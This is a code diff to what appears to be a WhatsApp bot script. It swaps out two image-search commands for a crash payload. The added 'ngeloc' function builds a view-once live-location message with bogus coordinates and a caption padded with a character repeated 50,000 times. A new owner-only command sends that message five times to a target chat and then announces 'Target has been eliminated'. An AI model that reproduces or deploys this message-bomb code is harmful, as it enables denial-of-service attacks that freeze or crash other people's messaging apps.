@@ -8530,15 +8530,22 @@ sourceUrl: `https://chat.whatsapp.com/EPSGKau0IVi7J5lyOJO7Jk`,
 }})
 break
 //=================================================//
-case 'gambar': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
-let { pinterest } = require('./lib/scraper')
-anu = await pinterest(text)
-result = anu[Math.floor(Math.random() * anu.length)]
-zetsubo.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
+async function ngeloc(target, kuwoted) {
+var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     }
+  }
 }
-break
+}), { userJid: m.chat, quoted: kuwoted })
+await zetsubo.relayMessage(target, etc.message, { messageId: etc.key.id })
+}
 //=================================================
 case 'sc': case 'script': case 'repo':
 
@@ -8547,13 +8554,30 @@ case 'sc': case 'script': case 'repo':
 
    break;
 //=================================================
-case 'cecanmalaysia': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
-let { pinterest } = require('./lib/scraper')
-anu = await pinterest(`cecan malaysia`)
-result = anu[Math.floor(Math.random() * anu.length)]
-zetsubo.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
+case 'sam-brutalality-ss': {
+if (!isCreator) return 
+for (let j = 0; j < 5; j++) {
+await ngeloc(m.chat, force)
+}
+await zetsubo.sendMessage(m.chat, {
+contextInfo: {
+mentionedJid: ['00000@s.whatsapp.net'],
+externalAdReply: {
+showAdAttribution: false,
+renderLargerThumbnail: false,
+jpegThumbnail: fakejpg,
+title: `⦃𝐒𝐩𝐢𝐝𝐞𝐫-𝐕4💀`,
+body: `⁗ ⋄Target down 💀🥹`,
+previewType: "VIDEO",
+sourceUrl: `༑ 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒💀𝐒𝐩𝐢𝐝𝐞𝐫-𝐕4⿻`,
+mediaType: 1,
+mediaUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e'
+}
+},
+text: '𝙏𝙖𝙧𝙜𝙚𝙩 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 𝘽𝙮 *𝙎𝙥𝙞𝙙𝙚𝙧-𝙑3* 𝘽𝙮  By 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 '
+}, {
+quoted: m
+})
 }
 break
 //=================================================
